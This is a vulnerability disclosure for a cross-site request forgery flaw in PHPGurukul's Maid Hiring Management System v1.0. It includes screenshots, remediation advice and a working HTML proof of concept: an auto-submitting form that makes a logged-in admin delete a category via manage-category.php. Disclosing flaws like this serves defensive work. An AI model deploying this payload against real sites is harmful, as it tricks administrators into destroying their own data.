**Project Name & Repo URL:**
[Maid Hiring Management System using PHP and MySQL](https://phpgurukul.com/maid-hiring-management-system-using-php-and-mysql/)

**Vulnerability Type:**
Client Side Request Forgery

**Affected Version(s):** v1.0

**💣Vulnerability Description:**
A Cross-Site Request Forgery (CSRF) vulnerability exists in the admin panel of PHPGurukul Hiring Management System, allowing an attacker to delete arbitrary hiring categories by tricking an authenticated admin into visiting a malicious site. This can lead to data deletion and unauthorized admin-level changes.

**👩‍💻Impact:**
Unauthorized category deletion.

**🛜Proof-of-Concept (PoC):**

1) There was a category delete functionality where only authenticated admin can delete category.
![1](https://github.com/user-attachments/assets/e89bd4f0-7e18-4160-a021-52782d46316a)
2) HTML code to send GET request to the endpoint `/admin/manage-category.php`
**CSRF-POC**
```
<html>
  <body>
    <form action="http://127.0.0.1/mhms/admin/manage-category.php">
      <input type="hidden" name="delid" value="13" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

3) Use the HTML code and craft a malicious URL.
![3](https://github.com/user-attachments/assets/53ce1a60-b26e-475e-8ea4-79dacbb18ab2)
4) After Admin clicks on the link, the category will be deleted.
![4](https://github.com/user-attachments/assets/20a44793-7785-4c3c-98ed-ea20a8649aa9)
![5](https://github.com/user-attachments/assets/f44af5f6-6f4c-44cb-8f47-72148378afcd)

**Recommendation:**
Implement of CSRF tokens in admin forms, enforce SameSite cookies, and validate request origin to prevent unauthorized actions.
